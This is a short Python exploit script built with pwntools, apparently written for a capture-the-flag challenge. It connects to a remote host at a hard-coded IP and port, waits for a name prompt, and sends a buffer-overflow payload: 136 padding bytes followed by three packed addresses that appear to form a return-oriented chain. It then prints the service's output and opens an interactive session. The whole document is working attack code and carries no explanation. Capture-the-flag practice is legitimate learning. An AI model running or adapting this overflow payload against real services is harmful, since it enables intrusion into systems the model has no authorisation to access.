from pwn import *


io = remote("45.76.91.112", 10061)
io.recvuntil("What is your name?")
password = b'A' * 136 + p64(0x4012DB) + p64(0x403072) + p64(0x401050)
io.sendline(password)

while True:
	try:
		# use "readline" from pwntools
		line = str(io.recvline())
		print(line)
	except:
		# could not read line => program exited
		break
#io.kill()

io.interactive()